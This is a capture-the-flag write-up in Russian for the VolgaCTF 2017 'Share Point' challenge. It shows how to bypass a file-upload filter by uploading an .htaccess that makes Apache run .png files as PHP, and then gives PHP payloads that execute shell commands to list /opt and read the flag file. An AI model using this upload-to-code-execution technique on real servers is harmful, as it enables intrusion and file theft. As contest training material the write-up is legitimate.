# Share Point - 200 points

Look! I wrote a good service for sharing your files with your friends, enjoy)
share-point.quals.2017.volgactf.ru

Hints:
* flag's location is **opt**imal

### Solution
Авторизация на сайте выдала себя в самом начале, логин и пароль соответствуют следующим регулярным выражениям:  
`login [\w]{4,}`  
`pass  [\w]{8,}`

![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_1.png)

Так как сайт связан с загрузкой файлов, проверяем какие форматы он принимает.  
Грузим пустой файл index.php для проверки и видим, что нам отказано.

![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_2.png)

Ладно, пробуем загрузить файл с раширением "png".

![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_3.png)

Всё загрузилось, файл видно и он отрабатывается, его можно скачать или посмотреть.

![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_4.png)

Были проведены попытки загрузить файл с ращирением "png" с кодом PHP внутри, путем подмены названия файла в прграмме перехвата трафика Charles. Сайт всё также не позволял загрузжать с таким расширение, так как проверка стояла после загрузки файла.  
Пробуем другой вариант. В ответах сервера мы видем там стоит Apache:

![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_9.png)

Загружаем файл [.htaccess](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/files/.htaccess).  
Этот файл позволяет управлять разными настройками сервера Apache.  
Вот содержимое нашего файла которое говорит серверу отрабатывать файлы формата "png" как PHP код.

file ".htaccess":

```
AddHandler application/x-httpd-php .png
```
Загрузка прошла успешно, теперь пробуем повторить наши действия с загрузкой изображения с PHP кодом.

![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_5.png)

После подсказки о расположении флага, где жирным было виделено его расположение, травим туда наш код
Грузим два файла:

[ls.png](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/files/ls.png):

```php
<?php
$tmp = `ls /opt`;
header("Content-type: image/png");
$name = "ls.txt";
$file = fopen($name, "w"); 
fputs($file, iconv('cp1251', 'utf-8', $tmp));
fclose ($file); 
?>
```

Пытаемся открыть наш файл, возвращаемся назад и видим, что наш скрипт сработал, создался файл "ls.txt" с содержимым "/opt":

![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_7.png)

В этой дирректории лежит файл с интересующим нас названием, отправляем второй файл с аналогичным содержанием, что бы его прочитать:

[cat.png](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/files/cat.png):

```php
<?php
$tmp = `cat /opt/flag.txt`;
header("Content-type: image/png");
$name = "cat.txt";
$file = fopen($name, "w"); 
fputs($file, iconv('cp1251', 'utf-8', $tmp));
fclose ($file); 
?>
```
В ответ получаем на флаг:

![](https://github.com/texh0k0t/VolgaCTF-2017-Quals-Write-Up/blob/master/Share%20Point/assets/Screenshot_8.png)
